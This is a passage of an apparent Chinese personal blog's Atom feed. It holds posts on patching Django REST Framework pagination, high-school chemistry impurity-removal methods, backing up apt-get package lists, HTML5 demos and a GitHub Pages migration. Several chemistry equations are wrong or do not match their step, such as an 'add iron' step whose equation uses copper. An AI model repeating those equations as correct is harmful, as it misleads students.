class="string">'Meta'</span>,object)</span>)</span>:</span></span><br><span class="line">            model = model_class</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _TimelineFilter</span><br></pre></td></tr></table></figure>
<p>修改<code>rest_framework/generics.py</code>，为<code>GenericAPIView</code>加入<code>hack_filter_class()</code>方法，放入上面定义的过滤器；再修改<code>get_filter_backends()</code>方法，使其生效：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .custom_filters <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericAPIView</span><span class="params">(views.APIView)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hack_filter_class</span><span class="params">(self)</span>:</span></span><br><span class="line">        filter_class = getattr(self, <span class="string">'filter_class'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_timeline_filter(filter_class):</span><br><span class="line">            self.filter_class = get_timeline_filter(self.model, filter_class)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filter_backends</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span><br><span class="line">        Returns the list of filter backends that this view requires.</span><br><span class="line">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.is_timeline:</span><br><span class="line">            self.hack_filter_class()</span><br><span class="line"></span><br><span class="line">        filter_backends = self.filter_backends <span class="keyword">or</span> []</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> filter_backends <span class="keyword">and</span> self.filter_backend:</span><br><span class="line">            warnings.warn(</span><br><span class="line">                <span class="string">'The `filter_backend` attribute and `FILTER_BACKEND` setting '</span></span><br><span class="line">                <span class="string">'are due to be deprecated in favor of a `filter_backends` '</span></span><br><span class="line">                <span class="string">'attribute and `DEFAULT_FILTER_BACKENDS` setting, that take '</span></span><br><span class="line">                <span class="string">'a *list* of filter backend classes.'</span>,</span><br><span class="line">                PendingDeprecationWarning, stacklevel=<span class="number">2</span></span><br><span class="line">            )</span><br><span class="line">            filter_backends = [self.filter_backend]</span><br><span class="line">        <span class="keyword">return</span> filter_backends</span><br></pre></td></tr></table></figure>
<p>最后再修改<code>rest_framework/pagination.py</code>，这个模块的功能是给<code>Serializer</code>加入分页机制中一些必要的域，如<code>next</code>和<code>previous</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line">sinceid_field = <span class="string">'sinceid'</span></span><br><span class="line">beforeid_field = <span class="string">'beforeid'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SinceIdField</span><span class="params">(serializers.Field)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_native</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value.object_list = value.object_list[:]</span><br><span class="line">            sinceid = max(obj.id <span class="keyword">for</span> obj <span class="keyword">in</span> value.object_list) </span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">        request = self.context.get(<span class="string">'request'</span>)</span><br><span class="line">        url = request <span class="keyword">and</span> request.build_absolute_uri() <span class="keyword">or</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> replace_query_params(url, **&#123;</span><br><span class="line">            sinceid_field: sinceid,</span><br><span class="line">            beforeid_field: <span class="string">''</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BeforeIdField</span><span class="params">(serializers.Field)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_native</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value.object_list = value.object_list[:]</span><br><span class="line">            beforeid = min(obj.id <span class="keyword">for</span> obj <span class="keyword">in</span> value.object_list) </span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">        request = self.context.get(<span class="string">'request'</span>)</span><br><span class="line">        url = request <span class="keyword">and</span> request.build_absolute_uri() <span class="keyword">or</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> replace_query_params(url, **&#123;</span><br><span class="line">            beforeid_field: beforeid,</span><br><span class="line">            sinceid_field: <span class="string">''</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaginationSerializer</span><span class="params">(BasePaginationSerializer)</span>:</span></span><br><span class="line"></span><br><span class="line">    count = serializers.Field(source=<span class="string">'paginator.count'</span>)</span><br><span class="line">    next = NextPageField(source=<span class="string">'*'</span>)</span><br><span class="line">    previous = PreviousPageField(source=<span class="string">'*'</span>)</span><br><span class="line">    before = BeforeIdField(source=<span class="string">'*'</span>)</span><br><span class="line">    since = SinceIdField(source=<span class="string">'*'</span>)</span><br></pre></td></tr></table></figure>
<p>完成了——在没有修改一处业务逻辑代码的前提下，我增强了分页机制。</p>
<h2 id="0x04_前端接口"><strong>0x04 前端接口</strong></h2><p>终于来到前端部分了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x01_什么是REST"><strong>0x01 什么是REST</strong></h2><p>“REST”这个词，也许会在许多场合上出现，但并不是每个人都理解它的意思。在维基百科中，它被定义为：</p>
<blockquote>
<p><strong>Re]]>
    </summary>
    
      <category term="HFMUN重构系列" scheme="http://hsfzxjy.github.io/tags/HFMUN%E9%87%8D%E6%9E%84%E7%B3%BB%E5%88%97/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[高中化学常用除杂方法]]></title>
    <link href="http://hsfzxjy.github.io//chemistry-impurity/"/>
    <id>http://hsfzxjy.github.io//chemistry-impurity/</id>
    <published>2015-04-21T16:00:00.000Z</published>
    <updated>2015-11-08T10:11:17.565Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_规律">0x00 规律</h2><ol>
<li>要除去弱酸性气体中混有的强酸性气体杂质，我们常选用弱酸性气体溶于水后形成的饱和盐溶液。若弱酸性气体溶于水后为一元酸，则用该酸形成的饱和正盐溶液。若为二元弱酸，则为该酸形成的饱和酸式盐，如$Cl_2$混有$HCl$气体，用饱和食盐水净化吸收，如$CO_2$中混有$HCl$、$SO_2$用饱和$NaHCO_3$溶液净化吸收。 </li>
<li>要除去非还原性气体中的还原性气体，应选用反应前后均具固体的具有氧化性的物质。如$CO_2$中混有的$CO$,用灼热的$CuO$除去。 </li>
<li>要除去非氧化性气体中的氧化性气体，应选用反应前后均是固体的具有还原性的物质。如$CO_2$中混有的$O_2$，用灼热的铜网除去。 </li>
<li>要除去中性气体中的酸性气体，用强碱溶液或碱石灰吸收。如：$CO$中的混有的$CO_2$用$NaOH$溶液吸收除去。 </li>
<li>要除去中性气体中的碱性气体(一般是$NH_3$),用浓硫酸吸收。如：N2中混有的$NH_3$，用浓硫酸吸收除去。 </li>
<li>要除去饱和烃中的烯烃、炔烃气体，用溴水吸收，如：$CH_4$中混有$C_2H_4$、$C_2H_2$，用溴水可吸收除去。 </li>
<li>要除去有机烃中混有的无机酸性气体可用$NaOH$溶液和碱石灰吸收而除去。 </li>
<li>还有些个别方法，就应该个别记住了。如NO中混有的少量$NO_2$气体，可用水吸收转化而除去，$C_2H_4$中混有的$H_2S$,除可用规律4的方法除去外，还可用$CuSO_4$或$Pb(NO_3)_2$等溶液除去。</li>
</ol>
<h2 id="0x01_常见除杂">0x01 常见除杂</h2><ol>
<li>N2($O_2$) ——灼热的铜丝 2Cu+$O_2$=2 $CuO$  </li>
<li>$CO_2$($H_2S$) ——用饱和$NaHCO_3$溶液 $NaHCO_3$+$H_2S$=NaHS+$H_2O$+$CO_2$↑  </li>
<li>$CO_2$($CO$) ——灼热的氧化铜 $CuO$+$CO$=Cu+$CO_2$  </li>
<li>$CO_2$($HCl$) ——用饱和$NaHCO_3$溶液 $NaHCO_3$+$HCl$=$NaCl$+$H_2O$+$CO_2$↑  </li>
<li>$H_2S$($HCl$) —— 用饱和NaHS溶液 NaHS+$HCl$=$NaCl$+$H_2S$  </li>
<li>$SO_2$($HCl$) ——用饱和NaHSO3溶液 NaHSO3+$HCl$=$NaCl$+$H_2O$+$SO_2$↑  </li>
<li>$Cl_2$($HCl$) ——用饱和食盐水，$HCl$易溶而$Cl_2$不溶     </li>
<li><p>$MnO_2$(碳粉)——</p>
<ol>
<li>将混合物在氧气中点燃 C+$O_2$=$CO_2$ 或者</li>
<li>通入灼热的氧化钙 C+$CaO$=Ca+$CO_2$↑(条件:高温) 或者</li>
<li>通入灼热的氧化铁 3C+2 $Fe_2O_3$=3CO2↑+ 4Fe  </li>
</ol>
</li>
<li><p>碳粉($MnO_2$)——加浓盐酸$MnO_2$+4$HCl$(浓)=$MnCl_2$+$Cl_2$↑+2$H_2O$  </p>
</li>
<li>C($CuO$)——加稀盐酸$CuO$+2$HCl$=$CuCl_2$+$H_2O$  </li>
<li><p>$Al_2O_3$($Fe_2O_3$) ——这个一步是无法除去的啊！  </p>
<ol>
<li><p><strong>方法一</strong>： </p>
<ol>
<li>将固体混合物溶于过量的氢氧化钠溶液，过滤除去氧化铁，留下滤液。 $Al_2O_3$+2$OH^{-}$=2$AlO^{2-}$+$H_2O$ </li>
<li>向滤液中通入过量的$CO_2$，过滤得到$Al(OH)_3$,加热使$Al(OH)_3$分解。 $AlO^{2-}$+2$H_2O$+$CO_2$=$Al(OH)_3$+$HCO_3^-$ 2$Al(OH)_3$=$Al_2O_3$+3$H_2O$   </li>
</ol>
</li>
<li><p><strong>方法二</strong>：     </p>
<ol>
<li><p>将固体混合物溶于过量的盐酸溶液中，是混合物完全溶解。 $Al_2O_3$+6$H^+$=2$Al^{3+}$+3$H_2O$ $Fe_2O_3$+6$H^+$=2$Fe^{3+}$+3$H_2O$     </p>
</li>
<li><p>加入过量$NaOH$溶液,过滤除去沉淀$Fe(OH)_3$, $Fe^{3+}$+3$OH^{-}$=$Fe(OH)_3$ $Al^{3+}$+4$OH^{-}$=$AlO^{2-}$+2$H_2O$  </p>
</li>
<li><p>向滤液中通入过量的$CO_2$，过滤得到$Al(OH)_3$,加热使$Al(OH)_3$分解。$AlO^{2-}$+2$H_2O$+$CO_2$=$Al(OH)_3$+$HCO_3^-$ 2$Al(OH)_3$=$Al_2O_3$+3$H_2O$如果是反一下就直接加氢氧化钠啊！  </p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<ol>
<li>SIO2($Al_2O_3$) ——加入稀盐酸$Al_2O_3$ + 6$HCl$ = 2AlCl3 + 3$H_2O$  </li>
<li>$FeCl_3$($FeCl_2$) ——通入氯气$Cl_2$+2 $FeCl_2$=2 $FeCl_3$   </li>
<li>$FeCl_2$($FeCl_3$) ——加入铁Cu+2 $FeCl_3$=$CuCl_2$+$FeCl_2$  </li>
<li>$NaCl$($NH_4Cl$) ——固体的话直接加热$NH_4Cl$=$NH_3$+$HCl$  </li>
<li>C2H6($C_2H_4$) ——通入溴水或者酸性高锰酸钾溶液$CH_2=CH_2$+$Br_2$→$CH_2Br-CH_2Br$  </li>
<li>溴苯($Br_2$) ——加入氢氧化钠2 $NaOH$+$Br_2$=$NaBr$+$NaBrO$+$H_2O$分液  </li>
<li>硝基苯($NO_2$) ——加入氢氧化钠2 $NO_2$ + 2 $NaOH$ = $NaNO_2$ + $NaNO_3$ +$H_2O$分液  </li>
<li>甲苯(苯酚)——加入氢氧化钠$Ph-OH$+$NaOH$=$Ph-ONa$+$H_2O$分液  </li>
<li>乙醛(乙酸)——加饱和碳酸钠2$CH_3COOH$ + $Na_2CO_3$ = 2$CH_3COONa$+ $H_2O$ + $CO_2$蒸馏</li>
<li>乙醇(水)——加氧化钙蒸馏  </li>
<li>乙酸乙酯(乙酸)——饱和碳酸钠溶液2$CH_3COOH$ + $Na_2CO_3$ = 2$CH_3COONa$+ $H_2O$ + $CO_2$分液  </li>
<li>肥皂(甘油)——加入$NaCl$，发生盐析进行过滤  </li>
<li>葡萄糖(淀粉)——加入稀硫酸水解$C_6H_{10}O_5$(淀粉)+$H_2O$=$C_6H_{12}O_6$(葡萄糖)  </li>
<li>溴乙烷(乙醇)——用水，分液 </li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_规律">0x00 规律</h2><ol>
<li>要除去弱酸性气体中混有的强酸性气体杂质，我们常选用弱酸性气体溶于水后形成的饱和盐溶液。若弱酸性气体溶于水后为一元酸，则用该酸形成的饱和正盐溶液。若为二元弱酸，则为该酸形成的饱和酸式盐，如$Cl_2$混有$]]>
    </summary>
    
      <category term="化学" scheme="http://hsfzxjy.github.io/tags/%E5%8C%96%E5%AD%A6/"/>
    
      <category term="学习" scheme="http://hsfzxjy.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何备份apt-get已安装的软件列表？]]></title>
    <link href="http://hsfzxjy.github.io//backup-apt-get/"/>
    <id>http://hsfzxjy.github.io//backup-apt-get/</id>
    <published>2015-04-18T16:00:00.000Z</published>
    <updated>2015-11-08T10:07:09.289Z</updated>
    <content type="html"><![CDATA[<p><code>apt-get</code>是 ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台ubuntu上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这个开放的操作系统。</p>
<p>但，如果有一天，系统需要被重装——或是无可救药了，抑或是购置了新的设备，问题来了：</p>
<blockquote>
<p>如何将现有电脑上的软件包迁移至新的系统呢？</p>
</blockquote>
<p>很简单。</p>
<p>首先，将原有的软件列表导出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --get-selections  &gt; app-backup-list.lst</span><br></pre></td></tr></table></figure>
<p>最好是设置一个定时任务，每隔一段时间就保存一次列表，并且要保存到一个独立的分区。以免某天系统真的坏了。</p>
<p>接下来便是导入了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --set-selections &lt; app-backup-list.lst</span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get dselect-upgrade</span><br></pre></td></tr></table></figure>
<p>至于软件源的备份，只需将<code>/etc/apt/sources.list</code>文件复制过去即可。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><code>apt-get</code>是 ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台ubuntu上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这个开放的]]>
    </summary>
    
      <category term="apt-get" scheme="http://hsfzxjy.github.io/tags/apt-get/"/>
    
      <category term="ubuntu" scheme="http://hsfzxjy.github.io/tags/ubuntu/"/>
    
      <category term="随手记" scheme="http://hsfzxjy.github.io/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[初试HTML5]]></title>
    <link href="http://hsfzxjy.github.io//html5-media-test/"/>
    <id>http://hsfzxjy.github.io//html5-media-test/</id>
    <published>2015-04-18T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<h2 id="audio_&amp;_video">audio &amp; video</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">video</span> <span class="attribute">src</span>=<span class="value">"http://www.w3school.com.cn/i/movie.ogg"</span> <span class="attribute">controls</span>=<span class="value">"controls"</span>&gt;</span></span><br><span class="line">您的浏览器不支持 video 标签。</span><br><span class="line"><span class="tag">&lt;/<span class="title">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">audio</span> <span class="attribute">src</span>=<span class="value">"http://www.w3school.com.cn/i/horse.ogg"</span> <span class="attribute">controls</span>=<span class="value">"controls"</span>&gt;</span></span><br><span class="line">Your browser does not support the audio element.</span><br><span class="line"><span class="tag">&lt;/<span class="title">audio</span>&gt;</span></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"center-example"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">video</span> <span class="attribute">src</span>=<span class="value">"http://www.w3school.com.cn/i/movie.ogg"</span> <span class="attribute">controls</span>=<span class="value">"controls"</span>&gt;</span></span><br><span class="line">    您的浏览器不支持 video 标签。</span><br><span class="line">    <span class="tag">&lt;/<span class="title">video</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">audio</span> <span class="attribute">src</span>=<span class="value">"http://www.w3school.com.cn/i/horse.ogg"</span> <span class="attribute">controls</span>=<span class="value">"controls"</span>&gt;</span></span><br><span class="line">    Your browser does not support the audio element.</span><br><span class="line">    <span class="tag">&lt;/<span class="title">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">## canvas</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line"><span class="tag">&lt;<span class="title">canvas</span> <span class="attribute">id</span>=<span class="value">"myCanvas"</span>&gt;</span></span><br><span class="line">    your browser does not support the canvas tag </span><br><span class="line"><span class="tag">&lt;/<span class="title">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    <span class="keyword">var</span> canvas=<span class="built_in">document</span>.getElementById(<span class="string">'myCanvas'</span>);</span><br><span class="line">    <span class="keyword">var</span> ctx=canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">    ctx.fillStyle=<span class="string">'#FF0000'</span>;</span><br><span class="line">    ctx.fillRect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">80</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">var</span> grd=ctx.createLinearGradient(<span class="number">0</span>,<span class="number">0</span>,<span class="number">175</span>,<span class="number">50</span>);</span><br><span class="line">    grd.addColorStop(<span class="number">0</span>,<span class="string">"#FF0000"</span>);</span><br><span class="line">    grd.addColorStop(<span class="number">1</span>,<span class="string">"#00FF00"</span>);</span><br><span class="line">    ctx.fillStyle=grd;</span><br><span class="line">    ctx.fillRect(<span class="number">0</span>,<span class="number">100</span>,<span class="number">175</span>,<span class="number">50</span>);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<div class="center-example"><br>    <canvas id="myCanvas" class="align-center"><br>        your browser does not support the canvas tag<br>    </canvas><br></div>

<script type="text/javascript">
    var canvas=document.getElementById('myCanvas');
    var ctx=canvas.getContext('2d');
    ctx.fillStyle='#FF0000';
    ctx.fillRect(0,0,80,100);
    var grd=ctx.createLinearGradient(0,0,175,50);
    grd.addColorStop(0,"#FF0000");
    grd.addColorStop(1,"#00FF00");
    ctx.fillStyle=grd;
    ctx.fillRect(0,100,175,50);
</script>

<h2 id="LocalStorage">LocalStorage</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $input = $(<span class="string">"#localstorage-input"</span>), key = <span class="string">'my-key'</span>;</span><br><span class="line">$input.val(localStorage.getItem(key));</span><br><span class="line">$input.on(<span class="string">'change, keyup'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    localStorage.setItem(key, $input.val());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><div class="example"><br>    <div class="form-group"><br>        <label class="control-label">这个文本框中的内容不会改变：</label><br>        <input id="localstorage-input" type="text" class="form-control"><br>    </div><br></div></p>
<script type="text/javascript">
    var $input = $("#localstorage-input"), key = 'my-key';
    $input.val(localStorage.getItem(key));
    $input.on('change, keyup', function () {
        localStorage.setItem(key, $input.val());
    })
</script>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="audio_&amp;_video">audio &amp; video</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</spa]]>
    </summary>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[博客迁移至Github.io]]></title>
    <link href="http://hsfzxjy.github.io//migrate-to-github.io/"/>
    <id>http://hsfzxjy.github.io//migrate-to-github.io/</id>
    <published>2015-04-16T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<p>###为什么迁出？</p>
<p>话说<strong>SinaAppEngine</strong>真是越来越不像话了：在没有征得我们开发者的同意的情况下擅自把应用总数限制调整为5个（整整少了一半！），还口口声声说是作过调查——</p>
<blockquote>
<p>“大约90%开发者只用5个应用就足够了。”</p>
</blockquote>
<p>同时，增加配额的钱还那么贵，实在担负不起的我只好精简应用数目，以防未来某天应用数不够用。</p>
<p>###为什么选择Github Pages？<br>本人爱好程序，习惯以代码的方式来做事——写文章时也不例外。因此，我需要找到一个支持Markdown的博客平台进行迁移。为此，我经历了很长时间的思想斗争——</p>
<p><strong>新浪、网易 等国内博客平台？</strong></p>
<p>果断否决。这些平台都是面向大众的，只提供富文本编辑器，效率捉急。</p>
<p><strong>博客园？“程序员的网上家园”，总会好一些吧？</strong></p>
<p>虽说最近博客园推出了Markdown编辑器，一切似乎很美好。但是——它——没有即时预览的功能！！这么重要的东西都不加上，写作时就像浑水中摸鱼一样，别提多不爽了。再说了，在博客园上聚集的多是些常工作于Windows平台下的程序员，在“信仰”方面有些合不来（别打我～～）。思考再三，还是否决了。</p>
<p>而事实上，比起公共博客平台，我还是比较喜欢个人博客。一来逼格比较高，可以为将来的交友、面试等活动加分；二来可以随心所欲地自定义样式，使网站完全符合我的Style。</p>
<p>这么一来，似乎就只剩下Github Pages了。</p>
<p>###那么，如何在Github Pages上进行写作？</p>
<p>首先要介绍一下 Github Pages 的架构。先看看 <a href="https://help.github.com/articles/using-jekyll-with-pages/#using-jekyll" target="_blank" rel="external">Github的介绍</a>：</p>
<blockquote>
<h4 id="Using_Jekyll">Using Jekyll</h4><p>Every GitHub Page is run through Jekyll when you push content to a specially named branch within your repository. For User Pages, use the master branch in your username.github.io repository. For Project Pages, use the gh-pages branch in your project’s repository. Because a normal HTML site is also a valid Jekyll site, you don’t have to do anything special to keep your standard HTML files unchanged. Jekyll has thorough documentation that covers its features and usage. Simply start committing Jekyll formatted files and you’ll be using Jekyll in no time.</p>
</blockquote>
<p>可以看得出来，Github Pages使用Jekyll作为后端引擎——这是一个用Ruby写的博客框架。但用户不需要写一行Ruby的代码，只需在名为<strong><username>.github.io</username></strong>的项目下面以一定的目录结构放置markdown文件，Jekyll便会自动生成整个站点。</p>
<p>这里需要注意的是，Jekyll生成的站点是<strong>静态的</strong>，也就是说站点的文件是Jekyll编译好之后存放在服务器端的，而不是接到请求之后才去编译站点，因此站点的访问速度是相当快的——这也是它的优点。</p>
<hr>
<p>我被这种机制深深地震惊了：这是一种我从来没见过的写作方式，无论是从方式上，抑或是从形式上。Jekyll 能让你真正专注于写作，而不是其他一些无谓的东西。     </p>
<p>它把一切无关的东西都摒弃了，这才是真正的极简主义。</p>
<hr>
<p>最初的Jekyll站点是没有样式的。为了不重复发明轮子，我决定使用现成的主题。在网上略一搜索便有了收获：<a href="http://jekyllbootstrap.com/" target="_blank" rel="external">Jekyll Bootstrap</a>。</p>
<p>Bootstrap是我最常用，也是最欣赏的一个前端框架。因此尽管这个主题仍在开发当中，我还是毫不犹豫地选中了它。    </p>
<p>从 <a href="https://github.com/plusjade/jekyll-bootstrap.git" target="_blank" rel="external">Github</a> 上将这个项目 clone 下来，覆盖到hsfzxjy.github.io项目下，理论上，站点就可以运行了。接下来，进行一些样式上的微调就可以了。   </p>
<p>至于评论系统，由于 Github Pages 是静态站点，因此只能使用第三方评论服务。Jekyll 默认的评论服务是Disqus ——一个国外的评论服务站点，但考虑到我在国内，许多人无法使用Facebook，Twitter等社交平台登录评论，我将它替换为了<strong>多说</strong>。具体操作，可以参考 <a href="http://havee.me/internet/2013-07/add-duoshuo-commemt-system-into-jekyll.html" target="_blank" rel="external">这里</a>。</p>
<p>Github Pages上的文章只能在本地编辑，因而需要一个趁手的 Markdown 编辑器。在 Ubuntu 环境下我使用的是 <strong>ReText</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install retext</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>###为什么迁出？</p>
<p>话说<strong>SinaAppEngine</strong>真是越来越不像话了：在没有征得我们开发者的同意的情况下擅自把应用总数限制调整为5个（整整少了一半！），还口口声声说是作过调查——</p>
<blockquote>
<p>“大约]]>
    </summary>
    
  </entry>
  
</feed>
